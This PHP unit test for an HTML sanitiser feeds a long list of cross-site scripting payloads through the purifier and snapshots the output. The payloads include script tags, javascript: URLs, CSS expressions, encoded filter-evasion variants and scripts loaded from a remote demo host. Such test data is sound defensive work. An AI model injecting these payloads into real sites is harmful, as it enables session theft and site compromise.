<?php

declare(strict_types=1);

namespace HTMLPurifier\Tests\Snapshots;

use HTMLPurifier\Tests\Traits\TestUtilities;
use PHPUnit\Framework\TestCase;
use Spatie\Snapshots\MatchesSnapshots;

/**
 * Class StringTest
 *
 * @package PHPUnit\Snapshots
 */
class StringTest extends TestCase
{
    use MatchesSnapshots;
    use TestUtilities;

    /**
     * @test
     * @dataProvider configProvider
     *
     * @param array $config
     */
    public function xssTest(array $config = []): void
    {
        $htmlPurifier = $this->createHtmlPurifier($config);
        $xss = $this->getXssStrings();

        foreach ($xss as $x) {
            $this->assertMatchesTextSnapshot(
                $htmlPurifier->purify($x)
            );
        }
    }

    /**
     * @return array
     */
    private function getXssStrings(): array
    {
        return [
            '\';alert(String.fromCharCode(88,83,83))//\\\';alert(String . fromCharCode(88, 83, 83))//";alert(String . fromCharCode(88,83,83))//\";alert(String.fromCharCode(88, 83, 83))//--></SCRIPT >">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}',
            '\'\';!--"<XSS>=&{()}',
            '<SCRIPT>alert(\'XSS\')</SCRIPT>',
            '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
            '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
            '<BASE HREF="javascript:alert(\'XSS\');//">',
            '<BGSOUND SRC="javascript:alert(\'XSS\');">',
            '<BODY BACKGROUND="javascript:alert(\'XSS\');">',
            '<BODY ONLOAD=alert(\'XSS\')>',
            '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
            '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">',
            '<DIV STYLE="width: expression(alert(\'XSS\'));">',
            '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
            '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
            '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
            '<IMG SRC="javascript:alert(\'XSS\');">',
            '<IMG SRC=javascript:alert(\'XSS\')>',
            '<IMG DYNSRC="javascript:alert(\'XSS\');">',
            '<IMG LOWSRC="javascript:alert(\'XSS\');">',
            '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
            'exp/*<XSS STYLE=\'no\xss:noxss("*//*"); xss:&#101;x&#x2F;*XSS*//*/* »/pression(alert("XSS"))\'>',
            '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS',
            '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
            '<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>',
            '<IMG SRC="livescript:[code]">',
            'scriptalert(XSS)/script',
            '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
            '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
            '<META HTTP-EQUIV="refresh" CONTENT="0;URL=http://;URL=javascript:alert(\'XSS\');">',
            '<IMG SRC="mocha:[code]">',
            '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>',
            '<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(\'XSS\')></OBJECT>',
            '<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>',
            '<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>',
            '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
            '<XSS STYLE="xss:expression(alert(\'XSS\'))">',
            '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>',
            '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
            '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
            '<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">',
            '<STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE>',
            '<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">',
            '<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>',
            '<TABLE BACKGROUND="javascript:alert(\'XSS\')"></TABLE>',
            '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')"></TD></TABLE>',
            '<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>',
            '<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript: alert(\'XSS\');">]]></C></X></xml><SPAN DATASRC=#IDATAFLD=C DATAFORMATAS=HTML>',
            '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
            '<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
            '<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert(\'XSS\')</SCRIPT>"></BODY></HTML>',
            '<!--[if gte IE 4]><SCRIPT>alert(\'XSS\');</SCRIPT><![endif]-->',
            '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
            '<XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">',
            '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
            '<!--#exec cmd="/bin/echo \'<SCRIPT SRC\'"--><!--#exec cmd="/bin/echo \'=http://ha.ckers.org/xss.js></SCRIPT>\'"-->',
            '<? echo(\'<SCR)\';echo(\'IPT>alert("XSS")</SCRIPT>\'); ?>',
            '<BR SIZE="&{alert(\'XSS\')}">',
            '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
            '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
            '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
            '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
            '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
            '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
            '<DIV STYLE="background-image:\0075\0072\006C\0028\'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029\'\0029">',
            "<DIV STYLE=\"background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029\">",
            '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
            '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html;charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-',
            '\";alert(\'XSS\');//',
            '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
            '<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>',
            "<IMG SRC=\"jav\tascript:alert('XSS');\">",
            '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
            '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
            '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
            "<IMG\nSRC\n='\"\nj\na\nv\na\ns\nc\nr\ni\np\nt\n:\na\nl\ne\nr\nt\n(\n'\nX\nS\nS\n')\n\">",
            "<IMG SRC=java\0script:alert(\"XSS\")>",
            "&<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>",
            '<IMG SRC=" &#14; javascript:alert(\'XSS\');">',
            '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
            '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
            '<SCRIPT SRC=http://ha.ckers.org/xss.js',
            '<SCRIPT SRC=//ha.ckers.org/.j>',
            '<IMG SRC="javascript:alert(\'XSS\')"',
            '<IFRAME SRC=http://ha.ckers.org/scriptlet.html <',
            '<<SCRIPT>alert("XSS");//<</SCRIPT>',
            '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
            '<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>',
            '<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
            '<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
            '<SCRIPT a="blah" \'\' SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
            '<SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
            '<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
            '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
            '<SCRIPT a=">\'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
            '<A HREF="http://66.102.7.147/">XSS</A>',
            '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>',
            '<A HREF="http://1113982867/">XSS</A>',
            '<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>',
            '<A HREF="http://0102.0146.0007.00000223/">XSS</A>',
            "<A HREF=\"htt\tp://6&#09;6.000146.0x7.147/\">XSS</A>",
            '<A HREF="//www.google.com/">XSS</A>',
            '<A HREF="//google">XSS</A>',
            '<A HREF="http://ha.ckers.org@google">XSS</A>',
            '<A HREF="http://google:ha.ckers.org">XSS</A>',
            '<A HREF="http://google.com/">XSS</A>',
            '<A HREF="http://www.google.com./">XSS</A>',
            '<A HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>',
            '<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>',
        ];
    }
}
